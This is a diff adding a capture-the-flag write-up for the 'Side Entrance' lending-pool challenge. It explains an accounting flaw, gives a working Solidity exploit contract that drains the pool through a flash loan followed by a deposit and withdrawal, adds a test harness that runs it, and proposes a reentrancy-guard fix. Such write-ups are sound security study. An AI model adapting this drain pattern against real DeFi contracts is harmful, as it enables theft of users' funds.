@@ -210,3 +210,63 @@ Allow only trusted payload to be sent by the pool contract, remove `data` parame
         target.functionCall(trustedPayload);
         ...
 ```
+
+## Challenge #4 - Side Entrance
+A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
+
+It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
+
+Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.
+
+### `SideEntranceLenderPool.sol`: pool ETH accounting allows loaning ETH and depositing it inside a pool in the same `flashLoan` transaction leading to a loss of funds from the pool
+
+Hackers can call pool `deposit` function and deposit loaned ETH effectively stealing it from the pool without contract noticing it, `address(this).balance` check will return `true` which means `flasLoan` won't revert. But because `msg.value` in `deposit` call is added to `msg.sender` balance ownership of the funds is transfered from the pool to the malicious borrower contract.
+
+### Proof of concept
+
+Malicious borrower, notice `deposit` call inside `execute` funtion
+
+```
+// SPDX-License-Identifier: MIT
+
+import "../side-entrance/SideEntranceLenderPool.sol";
+
+pragma solidity ^0.8.0;
+
+contract SideExploit {
+    SideEntranceLenderPool public immutable pool;
+
+    constructor (SideEntranceLenderPool _pool) {
+        pool = _pool;
+    }
+
+    function attack() public {
+        pool.flashLoan(address(pool).balance);
+
+        pool.withdraw();
+        msg.sender.call{value: address(this).balance}("");
+    }
+
+    function execute() public payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+```
+
+Hack inside `side-entrance.challenge.js`
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('SideExploit');
+        exploit = await Exploit.deploy(pool.address);
+
+        await exploit.connect(player).attack();
+    });
+```
+
+### Mitigation
+
+Use reentrancy modifiers to restrict a `deposit` call from the `flashLoan` function
